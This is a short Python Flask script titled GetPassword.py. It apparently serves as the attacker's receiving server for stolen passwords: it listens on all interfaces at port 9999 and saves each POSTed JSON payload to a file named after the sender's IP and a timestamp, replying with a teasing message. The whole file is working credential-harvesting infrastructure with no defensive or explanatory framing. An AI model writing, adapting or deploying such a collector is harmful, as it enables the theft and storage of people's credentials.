# -*- coding: utf-8 -*-
# @Author  : 王翔
# @JianShu : 一梦七年诗
# @Date    : 2019/5/23 22:29
# Software : PyCharm
# version  ：Python 3.6.8
# @File    : GetPassword.py

from flask import Flask, request
import time
import json

app = Flask(__name__)


@app.route('/index', methods=["GET", "POST"])
def index():
    if request.method == 'POST':
        _txtName = '%s_%s.txt' % (request.remote_addr,
                                  time.strftime('%Y%m%d%H%M%S', time.localtime()))
        with open(_txtName, 'w', encoding='utf-8') as f:
            f.writelines(json.loads(request.data))
    return "小哥，里面玩儿啊"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9999)
